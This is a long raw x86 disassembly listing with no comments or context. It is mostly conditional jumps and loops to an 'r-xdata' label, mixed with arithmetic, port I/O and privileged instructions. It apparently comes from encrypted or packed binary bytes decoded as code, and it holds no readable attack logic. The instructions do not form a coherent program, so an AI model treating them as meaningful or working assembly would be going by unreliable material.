imul ebx [ edx ] 0x6e0b39d1
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbe2e2e2
pop ebx
push cs
loop r-xdata
sbb cl [ ebx ]
adc al 0x69
jb r-xdata
imul ebx [ esp + eax * 4 ] 0x69149f6b
imul ebx [ edi - 0x7be496f0 ] 0x6b
lahf
jb r-xdata
jb r-xdata
push edx
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
test [ ebx - 0x41 ] ch
call 0x1d60883c
jb r-xdata
jb r-xdata
jb r-xdata
shl dl cl
loop r-xdata
mov cl [ edi ]
shl ah 0x1
or al 0xb1
imul esp [ edx + ebx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
test [ ebx ] 0xa31b
pop ebx
jb r-xdata
test [ ebx - 0x61 ] ch
mov [ 0xffffffffaf5b212b ] al
mov eax 0xb4b1e2e2
test bl bl
0x1d1f610b 0x721d
cmp [ eax + 0x6b848088 ] 0xb7
jb r-xdata
sbb eax 0xa7698ab4
shl [ edx ] 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
push ds
fldenv [ ecx ]
or esp esp
test [ ebx + ebp * 2 - 0x68967569 ] 0x9e
xor dl cl
jb r-xdata
imul esi [ edx ] 0x6b8422d1
jb r-xdata
sbb eax 0x4180b1d
sbb eax 0xa725721d
call 0x6f62e593
outsd
sub bl [ edi ]
imul ebx [ ebx ] 0x209f6b84
imul ebx [ esp + eax * 4 ] 0x88269f6b
mov ah 0xb
push ebx
sbb eax 0x7272721d
mov bh 0x69
push cs
mov bl 0xb
sub [ ebx ] ecx
mov esp 0x72212bb9
jb r-xdata
push cs
pop ds
sbb eax 0x800bb21d
int1
loop r-xdata
sbb eax 0x6f727272
jb r-xdata
mov ah bh
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
or dl ah
mov dl 0xb1
jb r-xdata
sahf
outsd
push es
rcl [ ecx + ebp * 2 ] 0x1
sub al 0xb
sub al dh
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + edi + 0x1d ]
sbb eax 0x72727272
xchg [ 0x7c0beab5 ] bl
mov dl al
shl [ edx ] 0x1
mov dh dh
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + ebp * 8 - 0x1e ]
loop r-xdata
imul ebp esi 0xfffffff4
or ebx [ edi + 0x721d1d16 ]
in eax dx
push ss
shl edx 0x1
loop r-xdata
loop r-xdata
sbb eax 0xd6e90bb2
mov cl 0x6f
jb r-xdata
in eax dx
jb r-xdata

sbb ah [ edi + 0x1d ]
in eax dx

mov ch 0x69
sbb dl cl
cmp [ ebx ] ecx
outsb
jb r-xdata
loop r-xdata
test eax esp
mov ebp 0xe0850b0f
sub ebx [ eax ]
sbb eax 0xdb88a1d
imul ecx [ esi ] 0xb1ee0e61
mov ch 0xb
sbb eax 0x1a9fdb1d
in eax dx
jb r-xdata
jb r-xdata
int 0xd5
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x1ab76b16 ] 0x69
jb r-xdata
outsd
jb r-xdata
scasd [ edi ]
jb r-xdata
mov eax [ edi - 0x79e558db ]
jb r-xdata
aad 0xe2
mov dl 0x6f
popad
out dx al
sub ebp ebp
jb r-xdata
push ss
adc [ ecx + 0x1b ] ch
test [ ebx - 0x61 ] ch
jb r-xdata
mov dl 0x1d
jb r-xdata
cmp bh [ ebx + 0x50bf6b84 ]
jb r-xdata
jb r-xdata
sub [ 0xffffffffb5b5b51d ] bl
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
enter 0x1d24 0x1d
popad
mov edi 0x1ac60be8
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
in al 0xc
mov cl 0x6b
sbb ah dl
loop r-xdata
xchg esp eax
mov dl 0xb
xchg ebx eax
loop r-xdata
cld
mov [ edi + 0x2ca76b84 ] dl
jb r-xdata
test [ ebx ] 0xe2e2a31b
jb r-xdata
jb r-xdata
push ss
mov [ ebx + ebp * 2 + 0x326984b7 ] es
mov [ eax - 0x7f48947c ] al
jb r-xdata
call sub_45e591
sbb eax 0x1f2a6f6f
jb r-xdata
jb r-xdata
jb r-xdata
and al [ ebx + ebp * 2 - 0x58906d59 ]
jb r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
loop r-xdata
out dx al
fldenv [ ecx ]
sub ah al
mov dl 0x6f
jb r-xdata
or edi [ edi + 0x72e2e2f8 ]
sahf
adc ch ch
pushad
hlt
sbb eax 0x72727272
in eax dx
cmp [ eax - 0x7948947c ] 0x88
test [ eax - 0x7358947c ] edi
jb r-xdata
jb r-xdata
sbb eax 0x530b0697
jb r-xdata
jb r-xdata
sbb eax 0x1dd1eab4
or ebp [ 0x721d1d0e ]
jb r-xdata
mov [ esp + eax * 4 - 0x45c95895 ] cl
mov [ esi + 0x34a76b84 ] dl
shl [ edx ] 0x1
or edi [ esi ]
cmp [ 0x7272721d ] bl
jl r-xdata
mov dl 0x69
and al 0xa
cli
mov cl 0xb1
mov cl 0xb1
outsd
loop r-xdata
loopne r-xdata
sbb eax 0x7c0beab5
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
sbb eax 0xc2887272
or ebx eax
mov ebp 0x72727221
jb r-xdata
bound ebx [ bx ]
jb r-xdata
or edx [ eax + 0x72e2e2c2 ]
jb r-xdata
xor eax 0xa4e2e2d4
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x88f20e61
cmp [ edx + 0x6b849488 ] 0xffffffa7
adc bh [ edx + 0x1d12c80b ]
or [ 0xb22d11d ] ebx
mov [ 0x721d1d09 ] eax
jb r-xdata
fistp [ edi - 0x589812e6 ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
mov dl 0xb
jmp 0x73288b13
outsd
push ss
jb r-xdata
loop r-xdata
in eax dx
sbb eax 0xff180b1d
loop r-xdata
sub bl [ edi ]
jb r-xdata
mov ah 0xce
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
jb r-xdata
and eax 0x8e861aa7
jb r-xdata
imul esp [ esi + edx * 8 - 0x1d168ef5 ] 0x727272e2
jb r-xdata
sbb eax 0x180f0b1d
or ecx [ esi + 0x37 ]
sbb eax 0x3b69721d
mov [ ecx + 0x4ebf6b84 ] al
mov ecx 0x4cbf6b84
mov [ ecx + 0x5caf6b84 ] dl
mov ebx 0x6b849688
scasd [ edi ]
and [ ebx + 0x6b849788 ] bh
sub eax [ edx ]
loop r-xdata
jb r-xdata
sbb eax [ ebx + ebp * 2 + 0x1c69169f ]
jb r-xdata
xchg edi eax
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x69
cmpsd [ esi ] [ edi ]
sbb ch [ ecx + 0x62 ]
inc esi
loop r-xdata
jb r-xdata
and bh [ ebx + ebp + 0x72727221 ]
jb r-xdata
jb r-xdata
or eax esi
jb r-xdata
jb r-xdata
and cl [ ebx ]
jmp 0x73288283
loope r-xdata
or bh ah
or cl ch
loope r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xc4950b1d
loop r-xdata
mov dl ah
xor [ edx - 0x77443378 ] bh
test [ ebx - 0x59 ] ch
jb r-xdata
sbb esp [ ebx + 0x7272e2e2 ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
mov ch [ ecx - 0x59 ]
sbb eax [ ebx + ebp * 2 + 0x1c69209f ]
imul ebx [ ebx ] 0xede31d61
jb r-xdata
popad
jb r-xdata
imul esp [ edi - 0x958906e ] 0xffffff84
imul edx [ edi - 0x61689676 ] 0xb
mov edi 0x72e2e2f8
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
cmpsd [ esi ] [ edi ]
pop edx
scasd [ edi ]
scasd [ edi ]
mov edx 0x5ea72587
mov dl 0x1d
loop r-xdata
jb r-xdata
loop r-xdata
leave
jb r-xdata
sbb eax 0x2fd90b1d
sbb eax 0x7272721d
or esi ebp
out 0xe2 al
loop r-xdata
imul ecx [ esi ] 0xb290bb3
xchg [ eax + 0x6b84b885 ] cl
cmpsd [ esi ] [ edi ]
test [ ebx - 0x49 ] ch
or bh [ edi + 0x3 ]
or edx [ ebx ]
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x88
retn 0xb1b1
loop r-xdata
loop r-xdata
or dl ah
jb r-xdata
0xe2e07c0b 0x72e2
jb r-xdata
imul ebp [ edi + 0xb8b8824 ] 0xffffffe2
stc
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fst [ 0x72721d1d ]
loopne r-xdata
jb r-xdata
or esi [ esi ]
clc
loop r-xdata
mov [ eax + 0x6b843c69 ] dl
mov edi 0xd2800bb0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ebp [ ebx ]
and [ edx + 0x72 ] esi
mov esp 0x72e2e2c1
jb r-xdata
out dx al
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
hlt
test [ ecx - 0x26 ] ah
loop r-xdata
sbb eax 0x740bb21d
in al dx
pop ds
jb r-xdata
or edi [ edi - 0x1e ]
or edx [ edi + 0xa721d1d ]
arpl cx di
loop r-xdata
loop r-xdata
and ebp ebp
sbb ch ch
mov cl 0xb1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bh 0x1a
jb r-xdata
cmpsd [ esi ] [ edi ]
xor ah ch
loop r-xdata
sbb eax 0x676feab4
pop esi
sbb [ 0xffffffffb41db21d ] bl
shl [ edx ] 0x1
mov [ 0xffffffffe2fa270b ] al
mul edx
loop r-xdata
xchg edi eax
push cs
push ds
sbb ch [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esi [ edi + 0x6b84b802 ] 0xffffffb7
add cl dl
xor [ ebx ] cl
xchg edx eax
cli
loop r-xdata
salc
jb r-xdata
jb r-xdata
mov edi 0xe0050a12
loop r-xdata
cmc
loop r-xdata
and ch ch
0x88e2e2e2 0x1de2
sbb eax 0xb21d881d
jb r-xdata
imul ebx [ edi - 0x7be396ea ] 0x6b
lahf
jb r-xdata
jb r-xdata
mov edi 0xaf6b8450
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb bl [ 0x7272721d ]
sbb eax 0x37220baa
test [ ebx - 0x49 ] ch
mov eax 0x1d044d0b
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
inc edi
loop r-xdata
jb r-xdata
jpe r-xdata
cli
imul esp [ esi + edx - 0x1e ] 0xffffffe2
adc cl cl
adc esp [ ecx + 0x23 ]
loopne r-xdata
jb r-xdata
fwait
imul edi [ edi - 0x451edae6 ] 0xffffffbb
mov ebx 0x33d984bb
in eax dx
sub al 0x84
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
and [ ebx + ebp * 2 - 0x7745cf59 ] al
jb r-xdata
out 0xe2 al
loop r-xdata
imul ebx [ edi - 0x5f7742d8 ] 0xffffff84
loop r-xdata
or ecx ebx
and al 0xb
jb r-xdata
jb r-xdata
mov eax 0x86b76b84
mov bh 0x80
jb r-xdata
jb r-xdata
fistp [ edi - 0x598120a ]
loop r-xdata
cli
loop r-xdata
popad
jb r-xdata
mov [ es : ebx + ecx + 0x1d1d3653 ] dh
lahf
loop r-xdata
xchg edi eax
adc dh [ ebp - 0x1d1b6bf5 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x1d04180b
sbb eax 0x56a72572
mov ecx 0xe2e067ed
jb r-xdata
sbb eax 0xb72721d
jb r-xdata
sbb eax 0x9367ede3
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
sbb ch [ ecx + 0x3c ]
test [ ebx - 0x41 ] ch
sbb [ ecx + 0x3a ] ch
or ebp ebp
inc edx
pop ds
sbb eax 0xb51db21d
mov dl 0xb1
sbb eax 0xe2e24e75
loop r-xdata
mov cl 0xb1
mov cl 0x6f
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d231e
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in eax dx
jb r-xdata
test [ ebx - 0x61 ] ch
loop r-xdata
sub ebp ebp
jb r-xdata
loop r-xdata
sbb eax 0x4e741db2
jb r-xdata
imul esp [ edi - 0x6e7745fe ] 0xffffff84
imul esp [ edi - 0x20f44600 ] 0xffffffec
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbb0bf6b
jb r-xdata
or bh cl
cli
jb r-xdata
mov ebx 0xe2ff770b
loop r-xdata
jb r-xdata
salc
popad
mov ch 0xa
xchg [ 0xffffffff8e861aa7 ] esp
jb r-xdata
loop r-xdata
imul edx [ edx ] 0xe2d5cd0b
loop r-xdata
sbb eax 0xec740bb2
pop ss
fldenv [ ecx ]
in eax dx
and al 0xca
jb r-xdata
loop r-xdata
or esi edx
call 0x6e5189b6
cmp eax 0x72721d1d
jb r-xdata
outsd
jb r-xdata
or esi [ ecx - 0x17 ]
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
0x1f9e676f 0x1d1d
loop r-xdata
jb r-xdata
or esi [ edi - 0x1 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jmp 0x72b88c03
loop r-xdata
jb r-xdata
jno r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
cdq
and [ 0x180f0b1d ] ebx
push edi
xor bl [ edi ]
mov [ 0xbe088b2 ] bl
outsd
jb r-xdata
jb r-xdata
jb r-xdata
and [ 0x22d1721d ] ebx
or cl al
and al 0x1d
sbb eax 0xbee2661
jb r-xdata
jb r-xdata
sub dl cl
sbb eax 0x289f6b84
mov ebp 0x6b84a088
loop r-xdata
cmp [ ebx ] cl
mov eax [ 0x72e2e2ec ]
jb r-xdata
0x34af6b84 0x88bb
add [ ebx + ebp * 2 - 0x7744c551 ] 0xffffff85
test [ ebx - 0x51 ] ch
jb r-xdata
mov bh 0x7a
test [ ebx - 0x61 ] ch
jbe r-xdata
lahf
sub [ ebp + 0x6b84a088 ] bh
mov [ 0xffffffffe2c08a0b ] al
loop r-xdata
nop
or ecx [ edi ]
push ds
loop r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
and cl [ ebx ]
push ebp
test [ ebx - 0xa ] ch
in al dx
pushfd
jb r-xdata
jb r-xdata
sbb eax 0xf7990b1d
loop r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
imul esp [ edi - 0x337745d0 ] 0xffffffbb
jb r-xdata
mov ebx 0x6b849588
or ecx [ edx + 0x72e2e2c0 ]
push eax
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2bd186b4
loop r-xdata
jecxz r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
outsd
jb r-xdata
popad
cdq
adc eax 0x7272213a
jb r-xdata
mov ah 0xea
popad
sbb bl [ 0x692377ed ]
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
loop r-xdata
in eax dx
xchg ebx eax
in eax dx
mov [ edx + 0x1d05950b ] ah
jg r-xdata
and ebp [ ecx + 0x1b ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x32676f1d
pop ds
sbb eax 0x1db1b21d
mov ch 0xf6
imul edx [ edi + 0x32 ] 0x1f
out 0x19 al
in eax dx
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xae
or eax eax
add [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
outsd
test [ ebx - 0x49 ] ch
sub ch [ ecx + 0x32 ]
test [ ebx - 0x49 ] ch
mov ch 0x6f
adc dl 0xe2
test [ ebx - 0x41 ] ch
mov al 0xb
mov dl 0x6b
mov edi 0xe3b20b1e
loop r-xdata
sbb eax 0xceb41db2
jb r-xdata
loop r-xdata
jb r-xdata
inc eax
or al [ ebp + 0x611d1d3c ]
out dx al
ja r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb al [ esi + 0xbcc8e8e ]
add ecx [ edx ]
sbb eax 0xb2b3721d
test [ ebx - 0x49 ] ch
add bh [ eax + 0xb76b84 ]
shl [ eax ] 0x1
or edx [ edx + 0x72e2e2fa ]
jb r-xdata
jne r-xdata
jb r-xdata
jb r-xdata
dec ebp
salc
out dx al
jb r-xdata
bound ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
test [ es : ebx ] 0x2b
aad 0xe2
loop r-xdata
mov dl dh
outsd
cmpsd [ esi ] [ edi ]
push es
mov cl 0xb
pop ecx
jmp r-xdata
mov dl 0xa
test [ ebx - 0x11d99ee3 ] edi
imul esp [ edi + 0x1aa76906 ] 0x6b
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x49 ] ch
push es
mov eax 0x1d0fe50b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or edx [ esi ]
0xe2e2
sbb eax 0x930bb294
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edx + 0x12 ]
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
or edx [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x1d1d5be6
jb r-xdata
xor ch [ ecx + 0x20 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
scasd [ edi ]
xor [ ebx + 0x6b849688 ] bh
scasd [ edi ]
test [ ebx - 0x59 ] ch
xor al 0x69
and [ ebx ] ecx
mov ebx [ esi ]
sbb eax 0x6b84721d
scasd [ edi ]
xor bh [ ebx + 0x6b849588 ]
sbb eax 0x8872721d
jb r-xdata
push esi
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub bl [ bx ]
sbb eax 0x950bbb72
cmp al 0x1d
sbb eax 0xd6941d72
or esp [ esi - 0x10 ]
mov [ 0x1d05950b ] al
test [ ebx - 0x69 ] ch
mov ch [ ecx - 0x69 ]
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
sub ebx [ 0x3b680b1d ]
sbb eax 0x7272721d
or ebp [ esi + 0x13 ]
sbb eax 0x7272721d
sub dh dh
sbb esp [ ecx + 0x1d ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
and al 0xb
push ds
and ebx [ 0x7272721d ]
jb r-xdata
aaa
jb r-xdata
jb r-xdata
sbb eax 0xa90bb694
add al 0x1d
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
sbb [ eax + 0x1e6c0b80 ] cl
jb r-xdata
nop
or esp [ edi ]
and [ edx + 0x72 ] esi
sbb eax 0x72727272
mov ah dl
loop r-xdata
mov bh 0x10
mov eax 0x6b848e88
outsd
sub dx di
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jmp edx
loop r-xdata
jb r-xdata
imul esp [ edi + 0x16a725ea ] 0x878b8091
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
xchg edi eax
sbb eax 0xe2e21675
loop r-xdata
jb r-xdata

jb r-xdata
jb r-xdata
jb r-xdata
daa
jb r-xdata
push es
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x19 al
jb r-xdata
jb r-xdata
sbb eax 0x370bb41d
jb r-xdata
jb r-xdata
jb r-xdata
jne r-xdata
out 0x5b al
jb r-xdata
sbb eax 0xbf6be2e2
jb r-xdata
imul esi [ edi - 0x60947b86 ] 0x76
jb r-xdata
mul edx
mov ebp 0x360bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x30a76b84
jb r-xdata
imul esp [ ss : ebx + ecx ] 0x1d1d1c50
mov ah cl
jb r-xdata
loop r-xdata

jb r-xdata
sbb eax 0xb41db21d
xchg [ ecx + 0x2a ] ah
loopne r-xdata
pop ds
mov [ 0xffffffffb166ede2 ] al
pop ds
sbb eax 0x8ae2881d
adc edi edi
mov esp [ edx - 0x1d0523f5 ]
loop r-xdata
sbb eax 0x9961eab4
jb r-xdata
sub bl [ bx ]
sbb eax 0xb41db21d
outsd
push ebp
test [ ebx - 0xe ] ch
test [ edi + 0x30 ] ah
in eax dx
pop ds
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
or ebp [ esi ]
or ebx [ 0x7272721d ]
mov [ ebx - 0x40947b47 ] cl
push ss
imul edi [ 0x14bf6b84 ] 0x6b843a69
mov edi 0x843c691a
imul edi [ edi + 0xb3a6918 ] 0xffffffed
jb r-xdata
jb r-xdata
push ebp
not [ ebx + 0x1d21940b ]
sbb eax 0x72727272
jb r-xdata
jb r-xdata
sbb eax 0xa7611aa7
jb r-xdata
jb r-xdata
and ch ch
dec bx
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg edi eax
push ss
or esp ebp
or eax 0x72721d1d
sbb eax 0x72212b1d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esi [ edx ] 0x28b76b84
mov [ esi + 0x2ab76b84 ] cl
mov edi 0x6366ed1e
mov ch 0xb
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
0x9116a725 0x8b80
sahf
pop ds
sbb eax 0x530bb21d
iretd
pop edx
jb r-xdata
outsd
loop r-xdata
mov esp 0x72212bb9
jb r-xdata
jb r-xdata
imul esp [ edi + 0xaa76b1a ] 0xb16a769
jb r-xdata
loop r-xdata
cmp al 0x84
imul edi [ edi - 0x2d7ff450 ] 0xffffffe2
jb r-xdata
loop r-xdata
jb r-xdata
or ch [ ecx - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
out dx al
loop r-xdata
jb r-xdata
sbb al [ ebx + ebp * 2 - 0x5890f351 ]
and dl cl
sub esi [ ebx + ecx + 0x1d1d3c74 ]
jb r-xdata
and cl [ eax - 0x58947b0a ]
lodsb [ esi ]
cli
loop r-xdata
jb r-xdata
jb r-xdata
or ebx [ ebx ]
jb r-xdata
sbb eax 0x6be2e21d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
push ss
in al dx
loop r-xdata
mov ecx 0x1d1b360b
sbb eax 0xc2c6a66b
and cl [ bp + di ]
mov edx 0x6b848f88
cmpsd [ esi ] [ edi ]
mov edx 0x88b88d88
jb r-xdata
jb r-xdata
mov es si
outsb
or eax [ ebx ]
xlat
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x69
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or eax [ esp + ebx * 8 - 0x1e ]
loop r-xdata
sbb eax 0xe2f7990b
imul esp [ edi - 0x4bf445c6 ] 0x19
sbb eax 0x7272721d
popad
jb r-xdata
out dx al
jb r-xdata
imul ebp [ edx + 0x52 ] 0xffffffe2
loop r-xdata
jb r-xdata
loop r-xdata
mov bl [ ebx - 0x4a89de34 ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
test [ ebx - 0x59 ] ch
jb r-xdata
mov ebx 0x6b849b88
jb r-xdata
jb r-xdata
imul edx [ edi + 0x6ae468ea ] 0x30d1dbe6
imul esp [ ebx ] 0x1d5fa80b
sbb eax 0x35840a72
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
mov ebp 0x6b84a088
lahf
push edx
mov ebp 0x509f6b84
sbb eax 0x1d3fe30b
sbb eax 0xd1727272
sbb eax 0x1e9f6b84
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2e3e68a
loop r-xdata
push ds
0xbbbb
push ebp
movsb [ edi ] [ esi ]
in al 0x1d
add ah dh
loop r-xdata
popad
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb ah [ ecx - 0x59 ]
in eax dx
jb r-xdata
jb r-xdata
mov esp 0x3ca50aaa
sbb eax 0xd6a46b1d
jb r-xdata
mov dl 0xa
jb r-xdata
sub esp [ ecx ]
jb r-xdata
sbb eax 0x4b0b1697
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
loop r-xdata
loop r-xdata
jb r-xdata
lahf
adc al 0x84
imul esi [ edi + 0xb8b88be ] 0xffffffa8
mov cl 0x6f
and ch ch
jb r-xdata
jb r-xdata
mov dl 0x71
jb r-xdata
or dh dl
mov cl 0xb2
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
xchg edi eax
imul edi [ edi - 0x1c4df4e2 ] 0xffffffe2
loop r-xdata
call 0x7262c6dd
imul esp [ edi + 0x16a7690a ] 0xb
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
mov [ 0x7272e2e2 ] eax
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbae1251a
mov ebx 0xd984bbbb
xor ebp ebp
jb r-xdata
pop ebx
loop r-xdata
imul esp [ edi - 0x23bbf4e2 ] 0xffffffe2
test [ ebx - 0x59 ] ch
cmp bh [ edx + 0x1d19b40b ]
sbb eax 0x72727272
loope r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
pop ds
sbb eax 0xf17a0a1d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
0xe2c1
or cl [ esi - 0x5 ]
jb r-xdata
cmp eax 0x721d1d04
imul esp [ edx + ebx * 8 - 0x1d1c82f6 ] 0xffffffe2
loop r-xdata
imul ebx [ edx ] 0xe2e3dd0b
jb r-xdata
jb r-xdata
sbb ah cl
sbb ebp ebp
jb r-xdata
loop r-xdata
jb r-xdata
or ecx [ ebp + 0x72e2e2d7 ]
jb r-xdata
or dh [ ebx - 0x1d ]
sbb eax 0x751d0a97
loop r-xdata
or ah dl
jb r-xdata
push cs
jb r-xdata
jb r-xdata
imul esp [ edi + 0x2bb9bd1a ] 0x72727221
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ecx [ edx + 0x205260ed ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsb
adc ebx [ 0x7272721d ]
pop sp
imul esi edx 0xffffff84
xor ch ch
jb r-xdata
jb r-xdata
call 0xffffffffa70fa9c3
aaa
jb r-xdata
loop r-xdata
imul edi [ edx + ebp * 4 + 0x1d3ca50a ] 0x1d
imul esp [ esi + edx * 8 - 0x7cbbbf76 ] 0x9
jb r-xdata
cmp ebx [ 0x7272721d ]
jb r-xdata
fstp [ esi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
push ss
jb r-xdata
loop r-xdata
mov ch 0x1d
jb r-xdata
sbb eax 0xa340b1d
jb r-xdata
jb r-xdata
stc
or [ ebx + 0x1aa72587 ] 0x86
in eax dx
xchg ecx eax
loop r-xdata
jb r-xdata
imul edi [ edx ] 0x66ed3967
fist [ ebx ]
scasd [ edi ]
test [ edx ] 0x6
loop r-xdata
bound ebp [ ebx - 0x41 ]
sbb eax 0xe2e21a75
out dx al
jb r-xdata
loop r-xdata
mov ecx [ ebx ]
loop r-xdata
mul edx
imul edi [ edi - 0x60947bfc ] 0x14
test [ ebx - 0x49 ] ch
mov esi 0xa80b8b88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ esp + eax * 4 + 0xb06b76b ] cl
outsd
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xed33d984
and eax 0xbbbbbae1
test [ ebx - 0x59 ] ch
adc al 0x88
xchg edi eax
mov [ edi + 0x2ea76b84 ] cl
mov edx 0x88b88d88
0xe2e2de0b 0x72e2
jb r-xdata
loop r-xdata
jb r-xdata
fisubr [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esp [ esi + 0x2267c2c6 ] 0xb
loop r-xdata
pop edx
and ah dl
jb r-xdata
insb
jb r-xdata
sub esp [ ecx ]
jb r-xdata
xchg esi eax
jne r-xdata
jb r-xdata
neg [ 0x1e751dd4 ]
and cl [ ebx ]
jb r-xdata
cli
popad
sahf
shl al 0x5d
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx - 0xf3ef43e ] 0x7272e2e2
or ecx [ esi ]
mov dl [ ebx - 0x16 ]
out 0x15 al
mov ch 0x6b
movsb [ edi ] [ esi ]
mov [ 0xffffffffe2d19c0b ] al
loop r-xdata
inc esp
fsubr st2
or bl ch
jecxz r-xdata
sbb ebx [ 0xffffffffc6a66b1d ]
or esi [ esi ]
